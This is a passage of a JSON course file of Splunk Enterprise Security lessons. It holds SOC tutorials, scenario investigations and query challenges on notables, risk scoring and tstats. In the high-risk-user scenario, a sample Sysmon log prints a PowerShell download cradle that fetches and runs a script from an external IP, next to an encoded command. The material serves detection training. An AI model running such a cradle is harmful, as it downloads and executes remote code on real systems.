              "body": "<p>Notable events are stored in a dedicated index. You can query them directly:</p>",
              "spl": "`notable` | table _time, rule_name, urgency, status, owner, src, dest, user",
              "explanation": "The `notable` macro queries the notable index with proper field normalization. You'll see all your security alerts in one place."
            },
            {
              "title": "Common Notable Queries",
              "body": "<p>Here are the queries you'll use daily:</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "My Open Notables",
              "body": "<p>See what's assigned to you and needs action:</p>",
              "spl": "`notable` | where status IN (\"new\", \"in progress\") AND owner=\"your_username\" | sort -urgency, _time | table _time, rule_name, urgency, src, dest, user",
              "explanation": "Replace \"your_username\" with your actual username. This is your daily working queue."
            },
            {
              "title": "Today's Critical Alerts",
              "body": "<p>Start your shift by checking what's urgent:</p>",
              "spl": "`notable` earliest=-24h | where urgency=\"critical\" AND status=\"new\" | stats count by rule_name | sort -count",
              "explanation": "Shows unhandled critical alerts from the last 24 hours, grouped by rule. High counts may indicate an active incident or noisy rule."
            },
            {
              "title": "The Notable Workflow",
              "body": "<p>When you work a notable, follow this workflow:</p>\n                        <ol>\n                            <li><strong>Triage</strong>  Review the notable, assign yourself</li>\n                            <li><strong>Investigate</strong>  Use the drilldown searches, check related events</li>\n                            <li><strong>Document</strong>  Add comments with your findings</li>\n                            <li><strong>Resolve</strong>  Update status: True Positive, False Positive, or needs escalation</li>\n                        </ol>\n                        <p>All actions are logged, creating an audit trail.</p>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "es-003",
        "title": "Risk-Based Alerting: The Philosophy Shift",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Understand the RBA philosophy",
          "Learn how risk scores accumulate",
          "Query the risk index effectively"
        ],
        "tags": [
          "es",
          "rba",
          "risk",
          "detection"
        ],
        "description": "The biggest mental shift in ES: moving from \"alert per event\" to \"accumulated risk per entity.\" This changes everything.",
        "content": {
          "sections": [
            {
              "title": "The Problem with Traditional Alerts",
              "body": "<p>Traditional alerting has a fundamental problem: <strong>alert fatigue</strong>.</p>\n                        <p>Each suspicious event triggers an alert. Analysts drown in thousands of low-fidelity alerts, missing real threats in the noise.</p>\n                        <p>Risk-Based Alerting (RBA) flips this model:</p>\n                        <ul>\n                            <li>Instead of alerting on every event, <strong>assign risk points</strong></li>\n                            <li>Risk accumulates per user or host over time</li>\n                            <li>Alert when an entity's <strong>total risk</strong> exceeds a threshold</li>\n                        </ul>\n                        <p>Result: Fewer, higher-fidelity alerts focused on entities with multiple suspicious behaviors.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "How Risk Accumulates",
              "body": "<p>Every detection rule can contribute risk instead of (or in addition to) creating a notable:</p>\n                        <table style=\"width:100%; border-collapse: collapse; margin: 1rem 0;\">\n                            <tr style=\"border-bottom: 1px solid var(--border-subtle);\">\n                                <th style=\"text-align:left; padding: 0.5rem;\">Event</th>\n                                <th style=\"text-align:left; padding: 0.5rem;\">Risk Score</th>\n                                <th style=\"text-align:left; padding: 0.5rem;\">Risk Object</th>\n                            </tr>\n                            <tr><td style=\"padding: 0.5rem;\">Failed login attempt</td><td>5</td><td>user: jsmith</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Login from new country</td><td>20</td><td>user: jsmith</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Accessed sensitive file share</td><td>15</td><td>user: jsmith</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Large data download</td><td>25</td><td>user: jsmith</td></tr>\n                            <tr><td style=\"padding: 0.5rem; font-weight: bold;\">Total Risk</td><td style=\"font-weight: bold;\">65</td><td> Alert threshold: 50</td></tr>\n                        </table>\n                        <p>None of these events alone would warrant an alert. Together, they tell a story.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Querying the Risk Index",
              "body": "<p>Risk events are stored in a dedicated index. Here's how to explore them:</p>",
              "spl": "index=risk | stats sum(risk_score) as total_risk, dc(source) as detection_count, values(source) as detections by risk_object | where total_risk > 50 | sort -total_risk",
              "explanation": "This shows all entities with accumulated risk above 50, what detections contributed, and the total score. This is your high-priority investigation list."
            },
            {
              "title": "User Risk Timeline",
              "body": "<p>When investigating a high-risk user, build a timeline of what triggered the risk:</p>",
              "spl": "index=risk risk_object=\"jsmith\" | table _time, source, risk_score, risk_message | sort _time",
              "explanation": "Shows every risk event for a specific user in chronological order. Each \"source\" is the detection rule that contributed risk."
            },
            {
              "title": "Risk Modifiers",
              "body": "<p>ES can automatically adjust risk based on asset/identity context:</p>\n                        <ul>\n                            <li><strong>Critical asset</strong>  Risk multiplied by 4x</li>\n                            <li><strong>High priority</strong>  Risk multiplied by 3x</li>\n                            <li><strong>Executive user</strong>  Risk multiplied by 2x</li>\n                        </ul>\n                        <p>A failed login to a regular workstation might score 5 points. The same event on a domain controller scores 20.</p>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "es-004",
        "title": "Your First Notable Investigation",
        "type": "scenario",
        "difficulty": "beginner",
        "duration": "25 min",
        "objectives": [
          "Navigate the ES Investigation workflow",
          "Use ES tools to gather context",
          "Document findings in the notable"
        ],
        "tags": [
          "es",
          "notable",
          "investigation",
          "workflow"
        ],
        "description": "Walk through a complete notable investigation using ES tools and workflows. Learn the process you'll follow every day.",
        "content": {
          "situation": "You're an analyst on the morning shift. A notable event fired overnight: \"Brute Force Access Behavior Detected\" with urgency=high. Your task is to investigate using ES tools and determine if this is a true positive.",
          "steps": [
            {
              "question": "First, let's find the notable and understand what triggered it. How do you query for this specific notable?",
              "hint": "Query the notable index and filter by rule name.",
              "spl": "`notable` rule_name=\"Brute Force Access Behavior Detected\" earliest=-24h | head 1 | table _time, rule_name, urgency, src, dest, user, owner, status",
              "analysis": "This retrieves the notable event with its key fields.",
              "output": {
                "columns": [
                  "_time",
                  "rule_name",
                  "urgency",
                  "src",
                  "dest",
                  "user",
                  "owner",
                  "status"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 03:42:18",
                    "rule_name": "Brute Force Access Behavior Detected",
                    "urgency": "high",
                    "src": "10.45.88.12",
                    "dest": "DC01.corp.local",
                    "user": "admin_backup",
                    "owner": "unassigned",
                    "status": "new"
                  }
                ]
              },
              "finding": "Notable triggered at 3:42 AM. Source IP 10.45.88.12 targeted the domain controller (DC01) with the admin_backup account. Status is \"new\" - no one has looked at this yet."
            },
            {
              "question": "Before diving into raw logs, let's use ES enrichment. What do we know about the source IP from asset inventory?",
              "hint": "Use the get_asset macro or lookup to enrich the IP.",
              "spl": "| makeresults | eval src=\"10.45.88.12\" | `get_asset(src)` | table src, nt_host, owner, priority, bunit, category",
              "analysis": "The get_asset macro enriches the IP with asset inventory data.",
              "output": {
                "columns": [
                  "src",
                  "nt_host",
                  "owner",
                  "priority",
                  "bunit",
                  "category"
                ],
                "rows": [
                  {
                    "src": "10.45.88.12",
                    "nt_host": "YOURPC-JIM",
                    "owner": "Jim Wilson",
                    "priority": "low",
                    "bunit": "Sales",
                    "category": "workstation"
                  }
                ]
              },
              "finding": "The source is a sales workstation owned by Jim Wilson. Why would a Sales workstation be authenticating to a DC at 3 AM with an admin account?"
            },
            {
              "question": "Now let's check the identity context. What do we know about the admin_backup account?",
              "hint": "Use the identity lookup to get user context.",
              "spl": "| makeresults | eval user=\"admin_backup\" | lookup identity_lookup_expanded identity as user | table user, first, last, email, bunit, priority, category",
              "analysis": "Look up identity information for the targeted account.",
              "output": {
                "columns": [
                  "user",
                  "first",
                  "last",
                  "email",
                  "bunit",
                  "priority",
                  "category"
                ],
                "rows": [
                  {
                    "user": "admin_backup",
                    "first": "Backup",
                    "last": "Service Account",
                    "email": "it-ops@company.com",
                    "bunit": "IT Operations",
                    "priority": "critical",
                    "category": "service_account"
                  }
                ]
              },
              "finding": "admin_backup is a critical service account owned by IT Operations. This account should never be used interactively from a workstation."
            },
            {
              "question": "Let's see the authentication pattern. How many failures vs successes from this source?",
              "hint": "Use tstats against the Authentication data model for speed.",
              "spl": "| tstats count from datamodel=Authentication where Authentication.src=\"10.45.88.12\" Authentication.dest=\"DC01.corp.local\" earliest=-24h by Authentication.action | rename Authentication.action as action",
              "analysis": "Count authentication outcomes from the attacking workstation to the DC.",
              "output": {
                "columns": [
                  "action",
                  "count"
                ],
                "rows": [
                  {
                    "action": "failure",
                    "count": "847"
                  },
                  {
                    "action": "success",
                    "count": "1"
                  }
                ]
              },
              "finding": "CRITICAL: 847 failed attempts followed by 1 success. The brute force attack succeeded!"
            },
            {
              "question": "The attacker got in! When exactly did the successful login happen and what happened after?",
              "hint": "Search raw authentication logs for the successful logon and check subsequent activity.",
              "spl": "index=wineventlog EventCode=4624 src_ip=\"10.45.88.12\" dest=\"DC01\" user=\"admin_backup\" earliest=-24h | table _time, EventCode, LogonType, src_ip, dest, user | append [search index=wineventlog dest=\"DC01\" user=\"admin_backup\" EventCode IN (4672, 4688) earliest=-24h] | sort _time | head 10",
              "analysis": "Find the successful logon and look for privilege escalation or command execution.",
              "output": {
                "columns": [
                  "_time",
                  "EventCode",
                  "LogonType",
                  "src_ip",
                  "dest",
                  "user"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 03:47:22",
                    "EventCode": "4624",
                    "LogonType": "10",
                    "src_ip": "10.45.88.12",
                    "dest": "DC01",
                    "user": "admin_backup"
                  },
                  {
                    "_time": "2024-01-15 03:47:22",
                    "EventCode": "4672",
                    "LogonType": "-",
                    "src_ip": "-",
                    "dest": "DC01",
                    "user": "admin_backup"
                  },
                  {
                    "_time": "2024-01-15 03:47:45",
                    "EventCode": "4688",
                    "LogonType": "-",
                    "src_ip": "-",
                    "dest": "DC01",
                    "user": "admin_backup"
                  }
                ]
              },
              "finding": "Successful RDP login (LogonType 10) at 03:47:22, followed by special privilege assignment (4672) and process execution (4688). This is confirmed compromise of a domain controller."
            }
          ],
          "conclusion": "<strong>Investigation Complete - True Positive Confirmed</strong><br><br>\n                    <strong>Summary:</strong> Brute force attack from Jim Wilson's workstation (10.45.88.12) against domain controller DC01. After 847 failed attempts, the admin_backup service account was successfully compromised at 03:47:22.<br><br>\n                    <strong>ES Actions Taken:</strong>\n                    <ul>\n                        <li>Updated notable status to \"In Progress\" and assigned to yourself</li>\n                        <li>Added investigation notes documenting the timeline</li>\n                        <li>Created a new notable for \"Compromised Service Account\" linked to this investigation</li>\n                    </ul>\n                    <strong>Recommended Response:</strong>\n                    <ol>\n                        <li>Disable admin_backup account immediately</li>\n                        <li>Isolate Jim Wilson's workstation (10.45.88.12)</li>\n                        <li>Check DC01 for persistence mechanisms</li>\n                        <li>Escalate to incident response team</li>\n                        <li>Update notable to \"Pending\" - awaiting IR team response</li>\n                    </ol>"
        }
      },
      {
        "id": "es-005",
        "title": "Investigating a High-Risk User",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "30 min",
        "objectives": [
          "Analyze accumulated risk scores",
          "Correlate multiple detection sources",
          "Build a risk investigation narrative"
        ],
        "tags": [
          "es",
          "rba",
          "risk",
          "investigation",
          "user"
        ],
        "description": "A user has exceeded the risk threshold. Multiple detections contributed to their score. Your job is to understand if this represents a real threat or coincidental events.",
        "content": {
          "situation": "The Risk Analysis dashboard shows user \"mthompson\" with a risk score of 85, well above the alerting threshold of 50. The score accumulated from 6 different detections over the past 48 hours. You need to determine if this is a coordinated attack or unrelated events.",
          "steps": [
            {
              "question": "First, let's see what detections contributed to this user's risk score.",
              "hint": "Query the risk index for this specific user.",
              "spl": "index=risk risk_object=\"mthompson\" earliest=-48h | stats sum(risk_score) as total_risk, count as events by source | sort -total_risk | table source, events, total_risk",
              "analysis": "Break down risk contributions by detection rule.",
              "output": {
                "columns": [
                  "source",
                  "events",
                  "total_risk"
                ],
                "rows": [
                  {
                    "source": "Access - Unusual Login Location",
                    "events": "1",
                    "total_risk": "25"
                  },
                  {
                    "source": "Endpoint - Suspicious PowerShell",
                    "events": "2",
                    "total_risk": "20"
                  },
                  {
                    "source": "Access - Multiple Failed Authentications",
                    "events": "1",
                    "total_risk": "15"
                  },
                  {
                    "source": "Data - Large Email Attachment",
                    "events": "3",
                    "total_risk": "15"
                  },
                  {
                    "source": "Access - After Hours Login",
                    "events": "1",
                    "total_risk": "10"
                  }
                ]
              },
              "finding": "Risk came from 5 different detection sources: unusual location, PowerShell, failed auths, email attachments, and after-hours access. These could be related or coincidental."
            },
            {
              "question": "Let's build a timeline. When did each risk event occur?",
              "hint": "Get the chronological sequence of risk events.",
              "spl": "index=risk risk_object=\"mthompson\" earliest=-48h | table _time, source, risk_score, risk_message | sort _time",
              "analysis": "Build the timeline of suspicious events.",
              "output": {
                "columns": [
                  "_time",
                  "source",
                  "risk_score",
                  "risk_message"
                ],
                "rows": [
                  {
                    "_time": "2024-01-14 23:15:00",
                    "source": "Access - After Hours Login",
                    "risk_score": "10",
                    "risk_message": "Login outside business hours"
                  },
                  {
                    "_time": "2024-01-14 23:22:00",
                    "source": "Access - Multiple Failed Authentications",
                    "risk_score": "15",
                    "risk_message": "12 failed logins in 5 minutes"
                  },
                  {
                    "_time": "2024-01-14 23:24:00",
                    "source": "Access - Unusual Login Location",
                    "risk_score": "25",
                    "risk_message": "Login from Russia (first time)"
                  },
                  {
                    "_time": "2024-01-15 00:45:00",
                    "source": "Endpoint - Suspicious PowerShell",
                    "risk_score": "10",
                    "risk_message": "Base64 encoded command"
                  },
                  {
                    "_time": "2024-01-15 01:12:00",
                    "source": "Endpoint - Suspicious PowerShell",
                    "risk_score": "10",
                    "risk_message": "Download cradle detected"
                  },
                  {
                    "_time": "2024-01-15 02:30:00",
                    "source": "Data - Large Email Attachment",
                    "risk_score": "5",
                    "risk_message": "50MB attachment to external"
                  },
                  {
                    "_time": "2024-01-15 03:15:00",
                    "source": "Data - Large Email Attachment",
                    "risk_score": "5",
                    "risk_message": "75MB attachment to external"
                  },
                  {
                    "_time": "2024-01-15 04:00:00",
                    "source": "Data - Large Email Attachment",
                    "risk_score": "5",
                    "risk_message": "60MB attachment to external"
                  }
                ]
              },
              "finding": "CLEAR ATTACK PATTERN: After-hours login  failed auth attempts  successful login from Russia  PowerShell execution  data exfiltration via email. This is a coordinated attack."
            },
            {
              "question": "The login from Russia is highly suspicious. Let's verify: is this user normally based in Russia?",
              "hint": "Check identity data and normal login patterns.",
              "spl": "| makeresults | eval user=\"mthompson\" | lookup identity_lookup_expanded identity as user | table user, first, last, city, country, bunit, priority | append [search index=risk earliest=-90d risk_object=\"mthompson\" source=\"Access - Unusual Login Location\" | stats count by risk_message]",
              "analysis": "Check user profile and historical unusual location alerts.",
              "output": {
                "columns": [
                  "user",
                  "first",
                  "last",
                  "city",
                  "country",
                  "bunit",
                  "priority"
                ],
                "rows": [
                  {
                    "user": "mthompson",
                    "first": "Michael",
                    "last": "Thompson",
                    "city": "Denver",
                    "country": "USA",
                    "bunit": "Finance",
                    "priority": "high"
                  }
                ]
              },
              "finding": "User is Michael Thompson from Finance in Denver. No historical logins from Russia. This is likely credential theft - someone is using his account remotely."
            },
            {
              "question": "What was the PowerShell activity? This could show attacker tools.",
              "hint": "Look at the Endpoint data model or Sysmon logs.",
              "spl": "index=sysmon EventCode=1 user=\"*mthompson*\" process_name=\"powershell.exe\" earliest=-48h | table _time, CommandLine | sort _time",
              "analysis": "Review PowerShell commands executed by the compromised account.",
              "output": {
                "columns": [
                  "_time",
                  "CommandLine"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 00:45:22",
                    "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA..."
                  },
                  {
                    "_time": "2024-01-15 01:12:18",
                    "CommandLine": "powershell.exe IEX(New-Object Net.WebClient).DownloadString(\"http://185.220.101.44/shell.ps1\")"
                  }
                ]
              },
              "finding": "Attacker used classic PowerShell attack patterns: base64 encoded commands and download cradle from external IP (185.220.101.44). This is automated attack tooling."
            },
            {
              "question": "Finally, let's check those email attachments. Who received the large files?",
              "hint": "Search email logs for external recipients.",
              "spl": "index=email src_user=\"*mthompson*\" attachment_size>10000000 earliest=-48h | table _time, src_user, recipient, attachment_name, attachment_size | sort _time",
              "analysis": "Identify data exfiltration targets.",
              "output": {
                "columns": [
                  "_time",
                  "src_user",
                  "recipient",
                  "attachment_name",
                  "attachment_size"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 02:30:15",
                    "src_user": "mthompson@company.com",
                    "recipient": "dropbox-upload@protonmail.com",
                    "attachment_name": "Q4_Financial_Report.xlsx",
                    "attachment_size": "52428800"
                  },
                  {
                    "_time": "2024-01-15 03:15:42",
                    "src_user": "mthompson@company.com",
                    "recipient": "dropbox-upload@protonmail.com",
                    "attachment_name": "Customer_Database_Export.csv",
                    "attachment_size": "78643200"
                  },
                  {
                    "_time": "2024-01-15 04:00:08",
                    "src_user": "mthompson@company.com",
                    "recipient": "dropbox-upload@protonmail.com",
                    "attachment_name": "Employee_Salary_Data.xlsx",
                    "attachment_size": "62914560"
                  }
                ]
              },
              "finding": "Data exfiltration confirmed. Financial reports, customer database, and salary data sent to a suspicious Protonmail address. This is a major data breach."
            }
          ],
          "conclusion": "<strong>Investigation Complete - Confirmed Account Compromise & Data Breach</strong><br><br>\n                    <strong>Attack Timeline:</strong>\n                    <ol>\n                        <li>23:15 - Attacker accessed mthompson's account after hours</li>\n                        <li>23:22 - Brief credential guessing (may have obtained partial creds)</li>\n                        <li>23:24 - Successful login from Russia using compromised credentials</li>\n                        <li>00:45-01:12 - Deployed PowerShell attack tools from external C2 (185.220.101.44)</li>\n                        <li>02:30-04:00 - Exfiltrated 185MB of sensitive data to external email</li>\n                    </ol>\n                    <strong>Risk-Based Alerting Value:</strong> No single event would have triggered investigation. The combination of events - each low-to-medium severity alone - painted the complete picture.<br><br>\n                    <strong>Immediate Actions:</strong>\n                    <ol>\n                        <li>Disable mthompson's account</li>\n                        <li>Block C2 IP (185.220.101.44) at perimeter</li>\n                        <li>Contact legal regarding data breach notification</li>\n                        <li>Preserve evidence for forensics</li>\n                    </ol>"
        }
      },
      {
        "id": "es-006",
        "title": "tstats vs stats: The ES Query Shift",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "20 min",
        "objectives": [
          "Understand when to use tstats vs stats",
          "Write efficient data model queries",
          "Translate standard searches to tstats"
        ],
        "tags": [
          "es",
          "tstats",
          "datamodel",
          "performance"
        ],
        "description": "The most common ES syntax change: learning to query accelerated data models with tstats instead of raw indexes with stats.",
        "content": {
          "sections": [
            {
              "title": "The Core Difference",
              "body": "<p><strong>stats</strong> works on raw events from indexes:</p>\n                        <pre class=\"spl-example\">index=wineventlog EventCode=4625 | stats count by user</pre>\n                        <p><strong>tstats</strong> works on accelerated data model summaries:</p>\n                        <pre class=\"spl-example\">| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by Authentication.user</pre>\n                        <p>Both give you counts by user, but tstats is <strong>10-100x faster</strong> on large time ranges because it reads pre-computed summaries, not raw events.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "tstats Syntax Explained",
              "body": "<p>The tstats syntax has specific requirements:</p>",
              "spl": "| tstats <aggregation> from datamodel=<Model> where <Model>.<field>=<value> by <Model>.<field>",
              "explanation": "Key points: (1) Starts with pipe, (2) Field names include the data model prefix like \"Authentication.user\", (3) \"from datamodel=\" is required."
            },
            {
              "title": "Common Translation: Authentication",
              "body": "<p><strong>Standard Splunk:</strong></p>\n                        <pre class=\"spl-example\">index=wineventlog EventCode=4625 | stats count by TargetUserName, IpAddress</pre>\n                        <p><strong>ES Data Model:</strong></p>",
              "spl": "| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by Authentication.user, Authentication.src | rename Authentication.* as *",
              "explanation": "The rename at the end strips the \"Authentication.\" prefix for cleaner output. Notice we use normalized field names: \"user\" instead of \"TargetUserName\", \"src\" instead of \"IpAddress\"."
            },
            {
              "title": "Common Translation: Network Traffic",
              "body": "<p><strong>Standard Splunk:</strong></p>\n                        <pre class=\"spl-example\">index=firewall | stats sum(bytes) as total_bytes by src_ip, dest_ip</pre>\n                        <p><strong>ES Data Model:</strong></p>",
              "spl": "| tstats sum(All_Traffic.bytes) as total_bytes from datamodel=Network_Traffic by All_Traffic.src, All_Traffic.dest | rename All_Traffic.* as *",
              "explanation": "Network Traffic uses \"All_Traffic\" as the data model object name. Field mappings: src_ipsrc, dest_ipdest."
            },
            {
              "title": "When tstats Can't Help",
              "body": "<p>tstats has limitations. Use regular stats when:</p>\n                        <ul>\n                            <li><strong>Field not in model</strong>  tstats only sees indexed fields in the data model</li>\n                            <li><strong>Need raw event details</strong>  tstats gives summaries, not individual events</li>\n                            <li><strong>Complex filtering</strong>  Some regex or eval logic requires raw events</li>\n                            <li><strong>Acceleration is behind</strong>  Very recent data may not be in summaries yet</li>\n                        </ul>\n                        <p><strong>Hybrid approach:</strong> Use tstats to identify interesting entities, then drill down to raw events:</p>",
              "spl": "| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by Authentication.src | where count > 100 | map search=\"search index=wineventlog src_ip=$src$ EventCode=4625 | head 5\"",
              "explanation": "tstats finds sources with 100+ failures quickly, then map retrieves sample raw events for investigation."
            },
            {
              "title": "Quick Reference: Data Model Names",
              "body": "<p>Common ES data models and their object names:</p>\n                        <table style=\"width:100%; border-collapse: collapse; margin: 1rem 0;\">\n                            <tr style=\"border-bottom: 1px solid var(--border-subtle);\">\n                                <th style=\"text-align:left; padding: 0.5rem;\">Data Model</th>\n                                <th style=\"text-align:left; padding: 0.5rem;\">Object Name</th>\n                                <th style=\"text-align:left; padding: 0.5rem;\">Common Fields</th>\n                            </tr>\n                            <tr><td style=\"padding: 0.5rem;\">Authentication</td><td>Authentication</td><td>user, src, dest, action, app</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Network_Traffic</td><td>All_Traffic</td><td>src, dest, src_port, dest_port, bytes</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Endpoint</td><td>Processes, Filesystem, etc.</td><td>process_name, user, dest</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Web</td><td>Web</td><td>url, src, dest, status, action</td></tr>\n                            <tr><td style=\"padding: 0.5rem;\">Email</td><td>All_Email</td><td>src_user, recipient, subject</td></tr>\n                        </table>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "es-007",
        "title": "Asset and Identity Enrichment",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "20 min",
        "objectives": [
          "Understand ES asset and identity frameworks",
          "Use enrichment macros and lookups",
          "Add business context to investigations"
        ],
        "tags": [
          "es",
          "asset",
          "identity",
          "enrichment",
          "lookup"
        ],
        "description": "One of ES's biggest advantages: automatic enrichment with business context. Learn to leverage asset and identity data in your investigations.",
        "content": {
          "sections": [
            {
              "title": "Why Enrichment Matters",
              "body": "<p>In standard Splunk, an IP is just an IP. In ES, that IP becomes:</p>\n                        <ul>\n                            <li>Server name: <strong>DBPROD-01</strong></li>\n                            <li>Owner: <strong>Database Team</strong></li>\n                            <li>Priority: <strong>Critical</strong></li>\n                            <li>Business Unit: <strong>Finance</strong></li>\n                            <li>Category: <strong>Production Database</strong></li>\n                        </ul>\n                        <p>This context changes how you prioritize and investigate. A port scan against a workstation is different from a port scan against a production database.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Asset Enrichment with get_asset",
              "body": "<p>The <code>`get_asset(field)`</code> macro enriches IP or hostname fields with asset data:</p>",
              "spl": "index=firewall dest_port=3389 | `get_asset(dest)` | table src, dest, nt_host, owner, priority, bunit, category",
              "explanation": "This finds RDP connections and enriches the destination IP with asset context. Now you can see if someone is RDP'ing to a critical server vs a workstation."
            },
            {
              "title": "Identity Enrichment with get_identity",
              "body": "<p>The <code>`get_identity4events(field)`</code> macro enriches usernames with identity data:</p>",
              "spl": "index=wineventlog EventCode=4625 | stats count by TargetUserName | `get_identity4events(TargetUserName)` | table TargetUserName, identity_first, identity_last, identity_bunit, identity_priority, count | sort -count",
              "explanation": "This counts failed logins by user and adds identity context. You can now see if the targeted accounts are service accounts, executives, or regular users."
            },
            {
              "title": "Enriching Both Ends of a Connection",
              "body": "<p>For network events, enrich both source and destination:</p>",
              "spl": "index=firewall bytes_out > 100000000 | `get_asset(src)` | `get_asset(dest)` | rename src_* as source_*, dest_* as destination_* | table src, dest, source_nt_host, source_category, destination_nt_host, destination_category, bytes_out",
              "explanation": "This finds large data transfers and shows asset context for both endpoints. You can quickly spot unusual patterns like \"workstation  internet\" with 100MB+ transfers."
            },
            {
              "title": "Direct Lookup Syntax",
              "body": "<p>Sometimes you need more control than the macros provide. Use lookups directly:</p>",
              "spl": "| inputlookup asset_lookup_by_str | table ip, nt_host, owner, priority, bunit, category | head 20",
              "explanation": "This shows the raw asset inventory data. You can also use: lookup asset_lookup_by_str ip as src_ip OUTPUT nt_host, owner, priority"
            },
            {
              "title": "Priority-Based Triage",
              "body": "<p>Use asset priority to focus on what matters:</p>",
              "spl": "index=firewall action=blocked | `get_asset(dest)` | where priority IN (\"critical\", \"high\") | stats count by dest, nt_host, priority, category | sort -count",
              "explanation": "This shows blocked traffic to critical/high priority assets. These deserve more attention than blocked traffic to low-priority workstations."
            }
          ]
        }
      },
      {
        "id": "es-008",
        "title": "Standard Splunk to ES Query Translation",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "15 min",
        "objectives": [
          "Translate raw index queries to data model queries",
          "Use ES macros for enrichment",
          "Apply CIM field naming"
        ],
        "tags": [
          "es",
          "translation",
          "datamodel",
          "tstats"
        ],
        "description": "Practice converting your existing Splunk searches to ES-optimized equivalents. This is the core skill for ES adoption.",
        "content": {
          "problem": "Translate this standard Splunk search to an ES-optimized version using `tstats` and the Authentication data model:\n\n```index=wineventlog EventCode=4625 | stats count by TargetUserName, IpAddress | where count > 10 | sort -count```",
          "hints": [
            "The Authentication data model normalizes login events",
            "`EventCode 4625` = failed authentication = `action=\"failure\"`",
            "`TargetUserName` maps to `Authentication.user`",
            "`IpAddress` maps to `Authentication.src`",
            "Remember to `rename` fields to strip the data model prefix"
          ],
          "solution": {
            "spl": "| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10 | sort -count",
            "explanation": "Key translations:\n index=wineventlog EventCode=4625  from datamodel=Authentication where Authentication.action=\"failure\"\n TargetUserName  Authentication.user\n IpAddress  Authentication.src\n stats  tstats (for accelerated data)\n\nThe tstats version will be dramatically faster on large time ranges because it queries pre-computed summaries instead of raw events."
          },
          "variations": [
            {
              "description": "Now add asset enrichment to see which workstations are being brute-forced:",
              "spl": "| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10 | `get_asset(src)` | table user, src, nt_host, owner, priority, count | sort -count"
            },
            {
              "description": "Add time-based grouping to see the attack timeline:",
              "spl": "| tstats count from datamodel=Authentication where Authentication.action=\"failure\" by _time span=1h, Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10"
            }
          ]
        }
      },
      {
        "id": "es-009",
        "title": "Notable Event Triage Challenge",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "15 min",
        "objectives": [
          "Query and analyze notable events",
          "Use urgency and status for prioritization",
          "Build analyst workload reports"
        ],
        "tags": [
          "es",
          "notable",
          "triage",
          "workflow"
        ],
        "description": "Practice the daily SOC workflow: querying notables, understanding workload, and identifying high-priority items.",
        "content": {
          "problem": "You're the shift lead and need to understand the current notable backlog. Write a query that shows: count of open notables by urgency level, with the average age in hours for each urgency level.",
          "hints": [
            "Use the `notable` macro to query the notable index",
            "Filter for open statuses: \"new\" or \"in progress\"",
            "Calculate age using: (now() - _time) / 3600 for hours",
            "Use stats to group by urgency and calculate averages"
          ],
          "solution": {
            "spl": "`notable` | where status IN (\"new\", \"in progress\") | eval age_hours = round((now() - _time) / 3600, 1) | stats count as open_notables, avg(age_hours) as avg_age_hours by urgency | sort -urgency",
            "explanation": "This gives you an instant view of the backlog:\n How many open notables at each urgency level\n How long they've been waiting on average\n\nIf you see 50 critical notables with an average age of 12 hours, you have a problem. If you see 10 low-urgency notables averaging 48 hours, that might be acceptable."
          },
          "variations": [
            {
              "description": "Break down by analyst to see who's overloaded:",
              "spl": "`notable` | where status IN (\"new\", \"in progress\") | stats count as assigned by owner, urgency | xyseries owner urgency assigned | fillnull value=0"
            },
            {
              "description": "Find notables that have been \"in progress\" too long (stale):",
              "spl": "`notable` | where status=\"in progress\" | eval age_hours = (now() - _time) / 3600 | where age_hours > 24 | table _time, rule_name, urgency, owner, age_hours | sort -age_hours"
            },
            {
              "description": "Show detection rule volume (which rules create the most work):",
              "spl": "`notable` earliest=-7d | stats count by rule_name | sort -count | head 20"
            }
          ]
        }
      },
      {
        "id": "es-010",
        "title": "Building a Risk Investigation Query",
        "type": "challenge",
        "difficulty": "advanced",
        "duration": "20 min",
        "objectives": [
          "Query the risk index for entity analysis",
          "Correlate risk events with source detections",
          "Build investigation-ready risk summaries"
        ],
        "tags": [
          "es",
          "rba",
          "risk",
          "investigation"
        ],
        "description": "Master the risk index queries that power RBA investigations. Build queries that tell the complete story of a high-risk entity.",
        "content": {
          "problem": "A user \"dlee\" has been flagged as high-risk. Build a comprehensive risk summary that shows: total risk score, count of contributing detections, the individual detections with their scores, and the time range of suspicious activity.",
          "hints": [
            "Query index=risk with risk_object=\"dlee\"",
            "Use stats to calculate the total and per-source breakdown",
            "earliest() and latest() functions can show the activity window",
            "values() can list all unique detection sources"
          ],
          "solution": {
